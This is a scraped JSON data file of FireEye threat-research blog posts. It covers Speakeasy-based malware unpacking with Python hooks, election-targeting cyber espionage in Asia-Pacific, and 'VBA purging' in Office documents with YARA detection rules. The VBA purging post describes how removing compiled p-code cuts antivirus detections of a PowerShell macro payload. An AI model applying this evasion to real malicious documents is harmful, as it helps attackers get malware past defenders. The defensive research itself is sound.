                "text": "Andrew Davis recently announced the public release of his new Windows emulation framework named Speakeasy . While the introductory blog post focused on using Speakeasy as an automated malware sandbox of sorts, this entry will highlight another powerful use of the framework: automated malware unpacking. I will demonstrate, with code examples, how Speakeasy can be used programmatically to: Bypass unsupported Windows APIs to continue emulation and unpacking Save virtual addresses of dynamically allocated code using API hooks Surgically direct execution to key areas of code using code hooks Dump an unpacked PE from emulator memory and fix its section headers Aid in reconstruction of import tables by querying Speakeasy for symbolic information Initial Setup One approach to interfacing with Speakeasy is to create a subclass of Speakeasy’s Speakeasy class. Figure 1 shows a Python code snippet that sets up such a class that will be expanded in upcoming examples. import speakeasy class MyUnpacker(speakeasy.Speakeasy): def __init__(self, config=None): super(MyUnpacker, self).__init__(config=config) Figure 1: Creating a Speakeasy subclass The code in Figure 1 accepts a Speakeasy configuration dictionary that may be used to override the default configuration. Speakeasy ships with several configuration files . The Speakeasy class is a wrapper class for an underlying emulator class. The emulator class is chosen automatically when a binary is loaded based on its PE headers or is specified as shellcode. Subclassing Speakeasy makes it easy to access, extend, or modify interfaces. It also facilitates reading and writing stateful data before, during, and after emulation. Emulating a Binary Figure 2 shows how to load a binary into the Speakeasy emulator. self.module = self.load_module(filename) Figure 2: Loading the binary into the emulator The load_module function returns a PeFile object for the provided binary on disk. It is an instance of the PeFile class defined in speakeasy/windows/common.py , which is subclassed from pefile ’s PE class. Alternatively, you can provide the bytes of a binary using the data parameter rather than specifying a file name. Figure 3 shows how to emulate a loaded binary. self.run_module(self.module) Figure 3: Starting emulation API Hooks The Speakeasy framework ships with support for hundreds of Windows APIs with more being added frequently. This is accomplished via Python API handlers defined in appropriate files in the speakeasy/winenv/api directory. API hooks can be installed to have your own code executed when particular APIs are called during emulation. They can be installed for any API, regardless of whether a handler exists or not. An API hook can be used to override an existing handler and that handler can optionally be invoked from your hook. The API hooking mechanism in Speakeasy provides flexibility and control over emulation. Let’s examine a few uses of API hooking within the context of emulating unpacking code to retrieve an unpacked payload. Bypassing Unsupported APIs When Speakeasy encounters an unsupported Windows API call, it stops emulation and provides the name of the API function that is not supported. If the API function in question is not critical for unpacking the binary, you can add an API hook that simply returns a value that allows execution to continue. For example, a recent sample’s unpacking code contained API calls that had no effect on the unpacking process. One such API call was to GetSysColor . In order to bypass this call and allow execution to continue, an API hook may be added as shown in Figure 4. self.add_api_hook(self.getsyscolor_hook, 'user32', 'GetSysColor', argc=1 ) Figure 4: Adding an API hook According to MSDN , this function takes 1 parameter and returns an RGB color value represented as a DWORD . If the calling convention for the API function you are hooking is not stdcall , you can specify the calling convention in the optional call_conv parameter . The calling convention constants are defined in the speakeasy/common/arch.py file. Because the GetSysColor return value does not impact the unpacking process, we can simply return 0 . Figure 5 shows the definition of the getsyscolor_hook function specified in Figure 4. def getsyscolor_hook(self, emu, api_name, func, params): return 0 Figure 5: The GetSysColor hook returns 0 If an API function requires more finessed handling, you can implement a more specific and meaningful hook that suits your needs. If your hook implementation is robust enough, you might consider contributing it to the Speakeasy project as an API handler! Adding an API Handler Within the speakeasy/winenv/api directory you'll find usermode and kernelmode subdirectories that contain Python files for corresponding binary modules. These files contain the API handlers for each module. In usermode/kernel32.py , we see a handler defined for SetEnvironmentVariable as shown in Figure 6. 1: @apihook('SetEnvironmentVariable', argc=2) 2: def SetEnvironmentVariable(self, emu, argv, ctx={}): 3:     ''' 4:     BOOL SetEnvironmentVariable( 5:         LPCTSTR lpName, 6:         LPCTSTR lpValue 7:         ); 8:     ''' 9:     lpName, lpValue = argv 10:    cw = self.get_char_width(ctx) 11:    if lpName and lpValue: 12:        name = self.read_mem_string(lpName, cw) 13:        val = self.read_mem_string(lpValue, cw) 14:        argv[0] = name 15:        argv[1] = val 16:        emu.set_env(name, val) 17:    return True Figure 6: API handler for SetEnvironmentVariable A handler begins with a function decorator (line 1) that defines the name of the API and the number of parameters it accepts. At the start of a handler, it is good practice to include MSDN's documented prototype as a comment (lines 3-8). The handler's code begins by storing elements of the argv parameter in variables named after their corresponding API parameters (line 9). The handler's ctx parameter is a dictionary that contains contextual information about the API call. For API functions that end in an ‘ A ’ or ‘ W ’ (e.g., CreateFileA ), the character width can be retrieved by passing the ctx parameter to the get_char_width function (line 10). This width value can then be passed to calls such as read_mem_string (lines 12 and 13), which reads the emulator’s memory at a given address and returns a string. It is good practice to overwrite string pointer values in the argv parameter with their corresponding string values (lines 14 and 15). This enables Speakeasy to display string values instead of pointer values in its API logs. To illustrate the impact of updating argv values, examine the Speakeasy output shown in Figure 7. In the VirtualAlloc entry, the symbolic constant string PAGE_EXECUTE_READWRITE replaces the value 0x40 . In the GetModuleFileNameA and CreateFileA entries, pointer values are replaced with a file path. KERNEL32.VirtualAlloc(0x0, 0x2b400, 0x3000, \"PAGE_EXECUTE_READWRITE\") -> 0x7c000 KERNEL32.GetModuleFileNameA(0x0, \"C:\\\\Windows\\\\system32\\\\sample.exe\", 0x104) -> 0x58 KERNEL32.CreateFileA(\"C:\\\\Windows\\\\system32\\\\sample.exe\", \"GENERIC_READ\", 0x1, 0x0, \"OPEN_EXISTING\", 0x80, 0x0) -> 0x84 Figure 7: Speakeasy API logs Saving the Unpacked Code Address Packed samples often use functions such as VirtualAlloc to allocate memory used to store the unpacked sample. An effective approach for capturing the location and size of the unpacked code is to first hook the memory allocation function used by the unpacking stub. Figure 8 shows an example of hooking VirtualAlloc to capture the virtual address and amount of memory being allocated by the API call. 1: def virtualalloc_hook(self, emu, api_name, func, params): 2:     ''' 3:     LPVOID VirtualAlloc( 4:        LPVOID lpAddress, 5:        SIZE_T dwSize, 6:        DWORD  flAllocationType, 7:        DWORD  flProtect 8:      ); 9:     ''' 10:    PAGE_EXECUTE_READWRITE = 0x40 11:    lpAddress, dwSize, flAllocationType, flProtect = params 12:    rv = func(params) 13:    if lpAddress == 0 and flProtect == PAGE_EXECUTE_READWRITE: 14:        self.logger.debug(\"[*] unpack stub VirtualAlloc call, saving dump info\") 15:        self.dump_addr = rv 16:        self.dump_size = dwSize 17:    return rv Figure 8: VirtualAlloc hook to save memory dump information The hook in Figure 8 calls Speakeasy’s API handler for VirtualAlloc on line 12 to allow memory to be allocated. The virtual address returned by the API handler is saved to a variable named rv . Since VirtualAlloc may be used to allocate memory not related to the unpacking process, additional checks are used on line 13 to confirm the intercepted VirtualAlloc call is the one used in the unpacking code. Based on prior analysis, we’re looking for a VirtualAlloc call that receives the lpAddress value 0 and the flProtect value PAGE_EXECUTE_READWRITE ( 0x40 ). If these arguments are present, the virtual address and specified size are stored on lines 15 and 16 so they may be used to extract the unpacked payload from memory after the unpacking code is finished. Finally, on line 17, the return value from the VirtualAlloc handler is returned by the hook. Surgical Code Emulation Using API and Code Hooks Speakeasy is a robust emulation framework; however, you may encounter binaries that have large sections of problematic code. For example, a sample may call many unsupported APIs or simply take far too long to emulate. An example of overcoming both challenges is described in the following scenario. Unpacking Stubs Hiding in MFC Projects A popular technique used to disguise malicious payloads involves hiding them inside a large, open-source MFC project. MFC is short for Microsoft Foundation Class , which is a popular library used to build Windows desktop applications. These MFC projects are often arbitrarily chosen from popular Web sites such as Code Project . While the MFC library makes it easy to create desktop applications, MFC applications are difficult to reverse engineer due to their size and complexity. They are particularly difficult to emulate due to their large initialization routine that calls many different Windows APIs. What follows is a description of my experience with writing a Python script using Speakeasy to automate unpacking of a custom packer that hides its unpacking stub within an MFC project. Reverse engineering the packer revealed the unpacking stub is ultimately called during initialization of the CWinApp object, which occurs after initialization of the C runtime and MFC. After attempting to bypass unsupported APIs, I realized that, even if successful, emulation would take far too long to be practical. I considered skipping over the initialization code completely and jumping straight to the unpacking stub. Unfortunately, execution of the C-runtime initialization code was required in order for emulation of the unpacking stub to succeed. My solution was to identify a location in the code that fell after the C-runtime initialization but was early in the MFC initialization routine. After examining the Speakeasy API log shown in Figure 9, such a location was easy to spot. The graphics-related API function GetDeviceCaps is invoked early in the MFC initialization routine. This was deduced based on 1) MFC is a graphics-dependent framework and 2) GetDeviceCaps is unlikely to be called during C-runtime initialization. 0x43e0a7: 'kernel32.FlsGetValue(0x0)' -> 0x4150 0x43e0e3: 'kernel32.DecodePointer(0x7049)' -> 0x7048 0x43b16a: 'KERNEL32.HeapSize(0x4130, 0x0, 0x7000)' -> 0x90 0x43e013: 'KERNEL32.TlsGetValue(0x0)' -> 0xfeee0001 0x43e02a: 'KERNEL32.TlsGetValue(0x0)' -> 0xfeee0001 0x43e02c: 'kernel32.FlsGetValue(0x0)' -> 0x4150 0x43e068: 'kernel32.EncodePointer(0x44e215)' -> 0x44e216 0x43e013: 'KERNEL32.TlsGetValue(0x0)' -> 0xfeee0001 0x43e02a: 'KERNEL32.TlsGetValue(0x0)' -> 0xfeee0001 0x43e02c: 'kernel32.FlsGetValue(0x0)' -> 0x4150 0x43e068: 'kernel32.EncodePointer(0x704c)' -> 0x704d 0x43c260: 'KERNEL32.LeaveCriticalSection(0x466f28)' -> None 0x422151: 'USER32.GetSystemMetrics(0xb)' -> 0x1 0x422158: 'USER32.GetSystemMetrics(0xc)' -> 0x1 0x42215f: 'USER32.GetSystemMetrics(0x2)' -> 0x1 0x422169: 'USER32.GetSystemMetrics(0x3)' -> 0x1 0x422184: 'GDI32.GetDeviceCaps(0x288, 0x58)' -> None Figure 9: Identifying beginning of MFC code in Speakeasy API logs To intercept execution at this stage I created an API hook for GetDeviceCaps as shown in Figure 10. The hook confirms the function is being called for the first time on line 2. 1: def mfc_init_hook(self, emu, api_name, func, params): 2:     if not self.trigger_hit: 3:         self.trigger_hit = True 4:         self.h_code_hook =   self.add_code_hook(self.start_unpack_func_hook) 5:         self.logger.debug(\"[*] MFC init api hit, starting unpack function\") Figure 10: API hook set for GetDeviceCaps Line 4 shows the creation of a code hook using the add_code_hook function of the Speakeasy class. Code hooks allow you to specify a callback function that is called before each instruction that is emulated. Speakeasy also allows you to optionally specify an address range for which the code hook will be effective by specifying begin and end parameters. After the code hook is added on line 4, the GetDeviceCaps hook completes and, prior to the execution of the sample's next instruction, the start_unpack_func_hook function is called. This function is shown in Figure 11. 1: def start_unpack_func_hook(self, emu, addr, size, ctx): 2:     self.h_code_hook.disable() 3:     unpack_func_va = self.module.get_rva_from_offset(self.unpack_offs) + self.module.get_base() 4:     self.set_pc(unpack_func_va) Figure 11: Code hook that changes the instruction pointer The code hook receives the emulator object, the address and size of the current instruction, and the context dictionary (line 1). On line 2, the code hook disables itself. Because code hooks are executed with each instruction, this slows emulation significantly. Therefore, they should be used sparingly and disabled as soon as possible. On line 3, the hook calculates the virtual address of the unpacking function. The offset used to perform this calculation was located using a regular expression. This part of the example was omitted for the sake of brevity. The self.module attribute was previously set in the example code shown in Figure 2. It being subclassed from the PE class of pefile allows us to access useful functions such as get_rva_from_offset() on line 3. This line also includes an example of using self.module.get_base() to retrieve the module's base virtual address. Finally, on line 4, the instruction pointer is changed using the set_pc function and emulation continues at the unpacking code. The code snippets in Figure 10 and Figure 11 allowed us to redirect execution to the unpacking code after the C-runtime initialization completed and avoid MFC initialization code. Dumping and Fixing Unpacked PEs Once emulation has reached the original entry point of the unpacked sample, it is time to dump the PE and fix it up. Typically, a hook would save the base address of the unpacked PE in an attribute of the class as illustrated on line 15 of Figure 8. If the unpacked PE does not contain the correct entry point in its PE headers, the true entry point may also need to be captured during emulation. Figure 12 shows an example of how to dump emulator memory to a file. with open(self.output_path, \"wb\") as up: mm = self.get_address_map(self.dump_addr) up.write(self.mem_read(mm.get_base(), mm.get_size())) Figure 12: Dumping the unpacked PE If you are dumping a PE that has already been loaded in memory, it will not have the same layout as it does on disk due to differences in section alignment. As a result, the dumped PE's headers may need to be modified. One approach is to modify each section's PointerToRawData value to match its VirtualAddress field. Each section's SizeOfRawData value may need to be padded in order conform with the FileAlignment value specified in the PE’s optional headers. Keep in mind the resulting PE is unlikely to execute successfully. However, these efforts will allow most static analysis tools to function correctly. The final step for repairing the dumped PE is to fix its import table. This is a complex task deserving of its own blog post and will not be discussed in detail here. However, the first step involves collecting a list of library function names and their addresses in emulator memory. If you know the GetProcAddress API is used by the unpacker stub to resolve imports for the unpacked PE, you can call the get_dyn_imports function as shown in Figure 13. api_addresses = self.get_dyn_imports() Figure 13: Retrieving dynamic imports Otherwise, you can query the emulator class to retrieve its symbol information by calling the get_symbols function as shown in Figure 14. symbols = self.get_symbols() Figure 14: Retrieve symbol information from emulator class This data can be used to discover the IAT of the unpacked PE and fix or reconstruct its import related tables. Putting It All Together Writing a Speakeasy script to unpack a malware sample can be broken down into the following steps: Reverse engineer the unpacking stub to identify: 1) where the unpacked code will reside or where its memory is allocated, 2) where execution is transferred to the unpacked code, and 3) any problematic code that may introduce issues such as unsupported APIs, slow emulation, or anti-analysis checks. If necessary, set hooks to bypass problematic code. Set a hook to identify the virtual address and, optionally, the size of the unpacked binary. Set a hook to stop emulation at, or after, execution of the original entry point of the unpacked code. Collect virtual addresses of Windows APIs and reconstruct the PE’s import table. Fix the PE’s headers (if applicable) and write the bytes to a file for further analysis. For an example of a script that unpacks UPX samples, check out the UPX unpacking script in the Speakeasy repository. Conclusion The Speakeasy framework provides an easy-to-use, flexible, and powerful programming interface that enables analysts to solve complex problems such as unpacking malware. Using Speakeasy to automate these solutions allows them to be performed at scale. I hope you enjoyed this introduction to automating the Speakeasy framework and are inspired to begin using it to implement your own malware analysis solutions! Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/11/election-cyber-threats-in-the-asia-pacific-region.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-11-22",
                    "source": "www.fireeye.com"
                },
                "text": "In democratic societies, elections are the mechanism for choosing heads of state and policymakers. There are strong incentives for adversary nations to understand the intentions and preferences of the people and parties that will shape a country's future path and to reduce uncertainty about likely winners. Mandiant Threat Intelligence regularly observes cyber espionage operations we believe to be seeking election-related information targeting governments, civil society, media, and technology organizations around the globe. We have also seen disruptive and destructive cyber attacks and propaganda campaigns seeking to undermine targeted governments and influence the outcomes of electoral contests. The 2020 U.S. elections are currently drawing attention to election cyber risks, but 2020 has already hosted dozens of elections worldwide, with more to come. In the Asia-Pacific region these included elections in Taiwan, India, South Korea, and Singapore to name a few, with regional elections scheduled for Indonesia in December. Given the prevalence of such activity worldwide and Mandiant's unique visibility into threat actor activity, we believe it is worthwhile to examine trends in adversary targeting of elections in a variety of regional contexts because the tactics, techniques, and procedures (TTPs) used in one region today may soon be deployed or mimicked in other regions. Notable Electoral Targeting in Asia-Pacific Region Mandiant Threat Intelligence tracked numerous elections-related incidents in the Asia-Pacific region in recent years. During this time, the most prolific regional actor was China, which we observed in more than 20 elections-related campaigns most frequently affecting Hong Kong and Taiwan. We believe that China's primary motives for elections targeting includes monitoring political developments, internal stability, and supporting Belt and Road Initiative (BRI) investments. Examples of Chinese cyber espionage targeting electoral support organizations include: Targeting candidates and related staff associated with the November 2019 Hong Kong District Council elections with a malicious macro document. Targeting the Australian Parliament in February 2019, three months before the country's general elections. Compromising Cambodia's National Election Commission in mid-2018 based on the use of AIRBREAK malware by APT40, possibly looking to understand the impact of the election outcome on Belt and Road Initiative (BRI) plans. See our blog post for more details about this campaign. A spear phishing campaign targeting multiple government agencies in Southeast Asia in the spring of 2018 to deliver FIREPIT payloads. The nature of the lure material and targeting indicate the activity was potentially an effort to monitor an upcoming election in the affected country. Specifically, Mandiant has observed multiple instances in which organizations such as electoral boards and commissions that support or help administer elections have been targeted. Both Russian and Chinese cyber espionage operations have targeted election administrators and government officials since at least 2014. Observed TTPs include phishing and strategic website compromise (SWC), also known as watering hole attacks. For example, in the November 2019 activity targeting Hong Kong (previously referenced), Mandiant Threat Intelligence believes that candidates or related staff associated with the Hong Kong District Council elections were targeted with a malicious macro document just prior to the elections based on geolocation information, the spear-phishing lure, and other data. Figure 1: Decoy content from phishing email Elections Ecosystem As our readers will know, Mandiant takes a specific approach to deconstructing attacks against elections, which we detailed in a previous blog post . Our approach examines threats through the lens of risk posed at various levels of the elections ecosystem. We break the elections threat landscape into distinct attack surfaces to better allow our customers and partners to take action. These include the following: Electoral Platforms Affecting Public Opinion Electoral Process Support Organizations Core Electoral Process Systems Figure 2: Attack surfaces associated with the electoral process Top Target of Election Cyber Threat Activity: Public Opinion Using our ecosystem taxonomy, based on activity observed from 2016 to 2019, Mandiant Threat Intelligence assesses that actors concentrated on \"platforms affecting public opinion\" much more often than \"core election systems\" such as voting machines, or \"electoral support organizations\" such as election commissions. Figure 3: Electoral platforms affecting public opinions are most frequently targeted Globally, we assess that actors continue to deploy disinformation in the form of fabricated news and hoaxes spread primarily via social media and counterfeit websites designed to mimic legitimate news organizations, which may be picked up by legitimate news organizations. In the last several years, we have seen influence operations use increasingly creative methods to blend their inauthentic messaging with legitimate speech (e.g., by interviewing, impersonating, and hiring legitimate journalists or experts, and sending letters to the editor to real publications). Malicious actors create and spread disinformation with the intent to mislead an electorate by causing reputational damage to an individual or political party, or by casting doubt regarding a particular issue or political process. Influence campaigns also seek to exacerbate existing societal divisions. In the Asia-Pacific region, Mandiant Threat Intelligence observed pro-China threat actors spoof Taiwanese media outlet TVBS (官方網站) to promote narratives in line with the People's Republic of China's (PRC's) political interests in a coordinated, inauthentic manner. The accounts use a variety of tactics in order to pose as Western media outlets, including the use of identical or near-identical usernames, display names, and profile photos as the accounts of the outlets they imitate. Figure 4: @TVSBnews quote-tweets People's Daily video citing alleged U.S. interference in foreign elections Public exposure of high-profile information operations, such as Russia's interference in the 2016 U.S. presidential election, has strengthened perceptions that such operations are effective. It also demonstrates the difficulty that open societies face in countering this threat, encouraging current and aspiring information operation sponsors to grow their efforts. We anticipate that influence operations conducted in support of the political interests of nation-states will increase in sophistication, volume, and diversity of actors through 2020 and beyond. In the last 12 months, Mandiant Threat Intelligence observed and reported on information operations conducted in support of the political interests of numerous countries. During Singapore's 2020 general elections, the country's first \"digital\" election, Mandiant Threat Intelligence identified multiple inauthentic accounts. These accounts did not, however, appear to be acting in a coordinated manner. Outlook and Implications We expect that threat actors will continue to target entities associated with elections worldwide for the foreseeable future and may expand the scope of this activity as long as the potential rewards of these operations outweigh the risks. State-sponsored actors almost certainly view targeting the electoral process as an effective means of projecting power and collecting intelligence. Furthermore, the continuous expansion of the social media landscape will likely encourage various actors to pursue information operations by promoting preferred narratives, including the use of propagating inauthentic or deceptive information. We have already seen tactics evolve to avoid detection and incorporate emerging technologies, such as \"deepfake\" or multimedia manipulation technology, to advance more believable and impactful information operations, and we expect these innovations to continue. Lower tech methods, such as outsourcing propaganda activities to real people hired specifically to spread false and misleading content, can hinder attribution efforts and potentially increase the effectiveness of operations if those people have a more specialized understanding of the information environment. To battle election threats, there is an urgent need to increase public awareness of the threat and inculcate behaviors that reduce the risk of compromise or disruption. These include everything from rigorously securing email to implementing policy around notification of cyber incidents in the supply chain. In addition, governments can consider mandating digital imprint requirements for election campaigning, increasing fines for electoral fraud, and increasing transparency around digital political advertisements. Investment in news verification and screening methodologies on search and social media platforms as well as public education efforts equipping voters and students to distinguish trustworthy information from suspicions may also reduce the impact of influence operations. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/11/purgalicious-vba-macro-obfuscation-with-vba-purging.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-11-19",
                    "source": "www.fireeye.com"
                },
                "text": "Malicious Office documents remain a favorite technique for every type\nof threat actor, from red teamers to FIN groups to APTs. In this blog\npost, we will discuss \"VBA Purging\", a technique we have\nincreasingly observed in the wild and that was first publicly\ndocumented by Didier Stevens in February 2020 . We will explain\nhow VBA purging works with Microsoft Office documents in Compound File\nBinary Format (CFBF), share some detection and hunting opportunities,\nand introduce a new tool created by Mandiant’s Red Team: OfficePurge . MS-OVBA File Format Before diving into VBA Purging, it is important to understand\ncertain components of Microsoft’s\nspecifications on VBA macros (MS-OVBA). We focus on MS-OVBAs in\nMicrosoft Office 97 documents that use the CFBF file format, instead\nof the modern Open Office XML (OOXML) format used by Microsoft Excel\n“.xlsx” and Microsoft Word “.docx” documents. MS-OVBA’s file structure stores\nall VBA data in a hierarchy , which consists of structured\nstorage that contain different types of streams. VBA code in an Office\ndocument is stored in various module streams that consists of two\nparts: the PerformanceCache (also known as\nP-code), and the CompressedSourceCode . The PerformanceCache section is an array of\nbytes that contains compiled VBA code. The CompressedSourceCode section contains VBA source\ncode that is compressed with Microsoft’s proprietary algorithm. The\nboundary between the two sections is determined by a MODULEOFFSET , which is stored in the dir stream. A diagram of a module stream is shown\nin Figure 1. Figure 1: Module stream diagram When a VBA macro is added to a document, the VBA engine saves a\ncompiled version in the PerformanceCache section of the relevant module stream to increase performance.\nHowever, an Office application will only access the PerformanceCache if its version and architecture\nmatch what was used to compile the original VBA code. This version and\nimplementation information is stored in the _VBA_PROJECT and __SRP_# streams. If the\nversions do not match, the compressed source code is decompressed,\ncompiled, and run instead. VBA Purging vs VBA Stomping In 2018, research by the Walmart security team brought a technique\nknown as “ VBA Stomping ” to wider\npublic awareness. Originally identified by Dr. Vesselin Bontchev in\n2016 , this technique allows attackers to remove compressed VBA\ncode from Office documents and still execute malicious macros without\nmany of the VBA keywords that AV engines had come to rely on for\ndetection. For an example of VBA stomping in-the-wild, check out “ STOMP\n2 Dis: Brilliance in the (Visual) Basics ”. VBA stomping takes advantage of how module streams are interpreted\nand exchanges malicious CompressedSourceCode with non-malicious VBA source code, leaving the PerformanceCache untouched. However, the success\nof this technique is Office-version dependent, implying that an\nattacker would have to do additional recon on their target and be\naware of their victims’ deployed Office versions. VBA purging modifies the module streams in the opposite way. Instead\nof changing the CompressedSourceCode , VBA\npurging completely removes the PerformanceCache data from the module stream and\nthe _VBA_PROJECT stream , changes the value\nof the MODULEOFFSET to 0, and removes all\nSRP streams (this is necessary because the _VBA_PROJECT and SRP streams contain version-dependent PerformanceCache data that will result in a\nruntime error when there is no PerformanceCache in the module stream). This\nremoves strings usually found in PerformanceCache that many AV engines and YARA\nrules depend on for detection. Once removed, attackers are able to use\nmore standard methodologies and execute suspicious functions (i.e. CreateObject ) without being detected. Figure 2 shows the OLE streams for a normal and a purged document,\nextracted using oledump .\nIn the original document, the Module1 PerformanceCache is 1291 bytes, while it is 0\nbytes in the VBA purged document. The purged document has no SRP streams and the _VBA_PROJECT stream has been reduced to 7 bytes. Figure 2: Analyzing VBA purged document\nwith oledump Testing the Effectiveness of VBA Purging Mandiant’s Red Team created a command line, C# tool called OfficePurge to test\nthis technique. OfficePurge supports Microsoft Office Word, Excel and\nPublisher documents that follow the CFBF file format. In the following\nexamples, we used OfficePurge and a VBA payload from the public\ntoolkit Unicorn to\ntest the effectiveness of VBA purging a Microsoft Office Word document\nthat contained a Base64 encoded PowerShell payload (Figure 3). Figure 3: Macro payload generated with Unicorn The strings output (Figure 4) for the original Word document shows\nUnicorn’s Base64 encoded PowerShell payload, which is detected by many\nsecurity products. On the other hand, the output for the VBA purged\ndocument does not fully show the Base64 encoded payload because the PerformanceCache is removed. The CompressedSourceCode still contains the Base64\nencoded payload, but Microsoft’s custom compression algorithm splits\nthe strings, making it harder for static analysis to detect it. Figure 4: Strings output with a purged\nand non-purged document Both documents were submitted to online sandboxes to test detection\ncapabilities of various products. VirusTotal’s detection rate of the\noriginal document (36/60) dropped by 67% after it was VBA purged (12/61) .\nVirusTotal also categorized the non-purged document as “create-ole”,\n“doc”, and “macros”, whereas the purged document was only categorized\nas “doc”. Figure 5: VirusTotal detection results\nfor non-purged Word document Figure 6: VirusTotal detection results\nfor purged Word document Detection and Hunting Opportunities With OfficePurge, we have the ability to quickly erase compiled VBA\ncode and reduce security product detections in public sandboxes, but\nwhy stop there? Using this test data, our next step is to build\nconditional detection logic in formats such as YARA rules, which can\nidentify VBA purged documents and allow us to hunt for previously\nundetected malicious documents. Under the “sample-data” folder in the\nOfficePurge GitHub repo, we have added original and purged documents\nfor each supported file type with a macro that will spawn calc.exe.\nSHA256 hashes are included at the end of this post. As mentioned before, this technique involves removing PerformanceCache data from the _VBA_PROJECT stream. MSDN documentation shows\nthat the minimum length for the _VBA_PROJECT stream is 7 bytes to fit the required fields in the stream header. The\nfollowing YARA rule searches for CFBF files with a 7 byte _VBA_PROJECT stream: rule FEYE_OLE_VBAPurged_1 { meta: author = \"Alyssa Rahman\n(@ramen0x3f)\" description = \"This\nfile has a _VBA_PROJECT stream that has been cleared. This is\nevidence of VBA purging, a technique where the p-code\n(PerformanceCache data) is removed from Office files that have\nan embedded macro.\" strings: $vba_proj = { 5F 00 56 00 42 00 41 00 5F 00 50 00 52 00 4F 00\n4A 00 45 00 43 00 54 00 00 00 00 00 00 00 00 00 } condition: uint32(0) == 0xe011cfd0 and (\nuint32(@vba_proj[1] + 0x78) == 0x07 ) } Searching with this logic on VirusTotal reveals a large number of\nmalicious documents, meaning this is very prevalent in the wild and in\nuse by attackers. This rule should identify most publicly documented\nexamples of VBA purging, such as 9fd864e578d8bb985cf71a24089f5e2f ( HornetSecurity ).\nHowever, it may also identify some false positives. As previously\nidentified by Didier\nStevens , some public libraries such as EPPlus may generate benign\ndocuments without PerformanceCache data and\nappear to be purged. Another important limitation of this rule is that the _VBA_PROJECT stream data doesn’t have to be\ncompletely removed. So while the stream size is 7 in all publicly\ndocumented examples of this technique, it doesn’t have to be exactly 7. One solution to this is to compare the compressed and compiled\nversions of a document’s macros and look for unexpected variations.\nAnother potential option is a YARA rule that searches the _VBA_PROJECT stream for keywords or bytes, which\nshould appear if the p-code is valid. But let’s take the easy path first and look for anomalies within\nOfficePurge. There’s a section within the code that overwrites the _VBA_PROJECT stream with a static header: // Remove performance cache in _VBA_PROJECT\nstream. Replace the entire stream with _VBA_PROJECT\nheader. byte[] data =\nUtils.HexToByte(\"CC-61-FF-FF-00-00-00\"); A little bit of Googling shows this header was built based on Microsoft’s\nspecifications . But if we compare a purged and unpurged document,\nit looks like that header actually varies from specifications in\npractice (Figure 7). Figure 7: Comparison of purged and\nunpurged document This header isn’t necessarily proof that a document is malicious or\nwas created with OfficePurge, but it could be a good indicator that\nthe document was created programmatically versus with Office products.\nWith anomalies such as this, we can start building a rule similar to\nthe following, which will search for documents with a “small” _VBA_PROJECT stream and this suspicious stream header: rule FEYE_OLE_VBAPurged_2 { meta: author = \"Michael Bailey (@mykill),\nJonell Baltazar, Alyssa Rahman (@ramen0x3f), Joseph\nReyes\" description = \"This file has a\nsuspicious _VBA_PROJECT header and a small _VBA_PROJECT\nstream. This may be evidence of the VBA purging tool\nOfficePurge or a tool-generated document.\" strings: $vba_proj = { 5F 00 56 00 42 00 41 00\n5F 00 50 00 52 00 4F 00 4A 00 45 00 43 00 54 00 00 00 00 00 00\n00 00 00 } $cc61 = {CC 61 FF FF 00 00 00} condition: uint32(0) == 0xe011cfd0 and (\nuint32(@vba_proj[1] + 0x78) >= 0x07 ) and (\nuint32(@vba_proj[1] + 0x78) < 0xff ) and $cc61 } Searching with the two rules shared here reveals a wide range of\nthreat actors and malware types leveraging VBA purging, or at least\nsome type of automated document generation. On VirusTotal, you’re\nlikely to see a number of Emotet payloads caught by this rule, which\nis understandable given how heavily it relies on malicious email\nattachments. Another top offender we observed was AgentTesla. Since these rules both turn up benign documents as well, they aren’t\nready for a production environment; however, they could be useful as\n“weak signals” for more manual threat hunting. Many static detection\nengines may struggle for accuracy when identifying the VBA purging\ntechnique. Dynamic analysis techniques, such as those used by\nFireEye’s MVX engine, will still detonate the malicious document\nproperly and be detected even if the VBA is purged. Conclusion For as long as companies use Office documents, attackers will be\ntrying to smuggle malicious macros into them. VBA purging represents a\nrecent example of how threat actors continually invent new ways to\nevade defenders. The artifacts discussed in this blog post should\nserve as a starting point for detecting VBA purging, and hopefully the\ntooling and indicators we have shared will help you hunt for\nadditional anomalies in malicious Office documents. Check out OfficePurge today! Indicators of Compromise File Name Description SHA256 Hash test.doc Unicorn macro payload in Word document without\nVBA purging f4431f02fe1e624fdb7bf2243bb72f1899d7eccb1ed7b2b42ed86e001e8bff28 test2.doc Unicorn macro payload in Word document with\nVBA purging 98bd119f928e8db4ed45f5426f2c35c5f6d6ccc38af029e7ab4b9cfcc1447c53 excel_calc.xls Sample document in OfficePurge’s\n“sample-data folder” de6583d338a8061bb1fc82687c8f5bff9a36ba1e2a87172e696ffaeca32567af excel_calc_PURGED.xls Sample document in OfficePurge’s\n“sample-data folder” 914a6cf78fe98e80b1dee87347adbc8f8b37a1dfe672aa5196885daa447e9e73 publisher_calc.pub Sample document in OfficePurge’s\n“sample-data folder” 4bce7c675edde20a3357bc1d0f25b53838ab0b13824ab7a5bbc09b995b7c832f publisher_calc_PURGED.pub Sample document in OfficePurge’s\n“sample-data folder” 36bdfaaf3ea228844507b1129b6927e1e69a2cd5e8af99d507121b1485d85e1e word_calc.doc Sample document in OfficePurge’s\n“sample-data folder” 23fa4b77c578470c1635fe20868591f07662b998716c51fbb53d78189c06154f word_calc_PURGED.doc Sample document in OfficePurge’s\n“sample-data folder” a7eac98b3477fc97ccfe94f1419a859061ca944dc95372265e922992bd551529 Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/10/head-fake-tackling-disruptive-ransomware-attacks.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2019-10-01",
                    "source": "www.fireeye.com"
                },
